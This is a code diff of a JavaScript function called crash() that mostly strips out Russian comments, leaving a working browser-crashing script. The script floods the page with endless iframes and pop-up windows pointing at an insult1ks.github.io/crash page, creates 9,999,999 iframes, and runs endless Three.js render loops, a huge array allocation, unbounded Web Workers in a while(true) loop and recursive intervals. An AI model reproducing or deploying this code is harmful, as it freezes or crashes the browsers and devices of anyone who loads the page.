@@ -1,6 +1,5 @@
 function crash() {
 
-  // Создание бесконечных iframe
   setInterval(function() {
     var iframe = document.createElement('iframe');
     iframe.src = 'https://insult1ks.github.io/crash';
@@ -9,13 +8,11 @@ function crash() {
     document.body.appendChild(iframe);
   }, 0);
 
-  // Открытие бесконечных всплывающих окон
   setInterval(function() {
     var popup = window.open('https://insult1ks.github.io/crash', '_blank', 'width=500,height=500');
     if (popup) popup.focus();
   }, 0);
 
-  // Бесконечный цикл с Three.js
   (function threeJSLoop() {
     var geometry = new THREE.BoxGeometry();
     var material = new THREE.MeshBasicMaterial({color: Math.random() * 0xffffff});
@@ -26,10 +23,10 @@ function crash() {
     var renderer = new THREE.WebGLRenderer();
     renderer.render(new THREE.Scene().add(cube), new THREE.Camera());
 
-    requestAnimationFrame(threeJSLoop); // Используем requestAnimationFrame вместо while (true)
+    requestAnimationFrame(threeJSLoop);
   })();
 
-  // Функция для создания большого массива
+  
   (function createLargeArray() {
     let largeArray = [];
 
@@ -38,7 +35,7 @@ function crash() {
     }
   })();
 
-  // Функция для загрузки множества iframe
+  
   (function loadMultipleIframes() {
     var url = 'https://insult1ks.github.io/crash';
     var numIframes = 9999999;
@@ -57,10 +54,9 @@ function crash() {
       document.body.appendChild(iframe);
 
       index++;
-    }, 0); // Задержка 0 миллисекунд между созданием iframe
+    }, 0);
   })();
 
-  // Canvas и анимация сетки
   (function startCanvasAnimation() {
     const canvas = document.createElement("canvas");
     canvas.width = window.innerWidth;
@@ -87,18 +83,15 @@ function crash() {
       requestAnimationFrame(drawGrid);
     }
 
-    // Запуск анимации сетки
     requestAnimationFrame(drawGrid);
   })();
 
-  // Бесконечные Web Workers
   (function startWebWorkers() {
     while (true) {
       new Worker("data:text/javascript," + encodeURIComponent("setInterval(() => { importScripts('createCookie.js'); }, 1);"));
     }
   })();
 
-  // Рекурсивные интервалы
   (function startRecursiveIntervals() {
     x = function() {
       setInterval(console.log, 1, Math.random());
